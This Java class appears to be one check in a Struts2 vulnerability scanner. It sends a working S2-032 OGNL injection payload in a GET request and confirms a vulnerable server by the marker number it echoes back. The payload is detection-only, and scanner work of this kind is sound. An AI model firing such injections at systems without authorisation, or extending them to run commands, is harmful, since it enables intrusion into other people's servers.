package struts2scan.payload;

import struts2scan.util.HttpClient;
import struts2scan.util.HttpResult;

import java.net.URL;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class S2_032 implements Check {
    public String printInfo(){
        String info = "[+] S2-032:影响版本Struts 2.3.20-2.3.28(除了2.3.20.3和2.3.24.3); GET请求发送数据";
        return info+"\n";
    }

    @Override
    public boolean check(URL url) throws Exception {
        return false;
    }


    @Override
    public boolean check(String protocol, String host, int port,String path) throws Exception {

        String number = "1008660253718";
        String poc = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b602%2b53718),1?%23xx:%23request.toString&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=10086";
        if (path==null){
            path = "/index.action";
        }else if(!path.endsWith(".action") && !path.endsWith(".do")){
            path = path+"index.action";
        }

        String url = protocol + "://" + host + ":" + port + path +"?" +poc;

        try {
            HttpResult result = HttpClient.get(url);
            Pattern p = Pattern.compile(number);
            Matcher m = p.matcher(result.getData());

            if (m.find()) {
                return true;
            } else {
                return false;
            }
        }catch (Exception e){
            return false;
        }


    }

}
